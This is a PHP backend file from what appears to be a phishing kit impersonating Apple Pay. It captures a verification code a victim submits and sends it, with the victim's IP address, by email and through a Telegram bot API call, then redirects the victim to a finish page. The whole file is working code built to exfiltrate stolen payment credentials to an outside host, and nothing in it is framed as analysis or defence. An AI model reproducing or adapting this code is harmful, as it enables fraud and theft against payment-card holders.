<?php

    session_start();
    require("../config.php");

    $_SESSION["code"] = $_POST["code"];

    $message = "
   🔱APPLE-PAY🔱

🔱 ApplePay Code: " . $_SESSION["code"] . "
🔱 Adress ip: " . _ip() . "
        ";

    if ($rezmail) {
        $Subject = "「🔱 」+1 ApplePay ・ " . $_SESSION['code'] . " ・ " . _ip();
        $head = "From: 🔱byHorus🔱 <info@horus.infos>";

        mail($mail, $Subject, $message, $head);
    }

    if ($reztelegram) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query(['text' => $message, 'chat_id' => $chat_id]));
    }

    header("Location: ../finish.php");
    die();
